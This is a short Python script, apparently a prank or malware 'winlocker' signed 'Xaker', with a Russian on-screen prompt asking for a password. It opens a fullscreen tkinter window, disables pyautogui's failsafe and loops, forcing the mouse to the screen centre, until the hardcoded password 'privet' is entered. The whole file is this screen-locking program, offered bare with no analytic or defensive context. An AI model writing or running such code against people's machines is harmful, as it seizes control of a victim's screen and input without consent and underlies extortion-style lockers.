import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    if entry.get() == "privet":
        k = True

def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes("-fullscreen", True)
    root.update()
    root.bind('<Return>', callback)

root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('From "Xaker" with love')
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
label0 = Label(root, text="Введи пароль и нажми Enter", font='Arial 20')
label0.place(x=width/2-75-130, y=height-25-100)
root.update()
sleep(0.2)
click(width/2, height/2)
k = False

while not k:
    on_closing()
    
root.destroy()
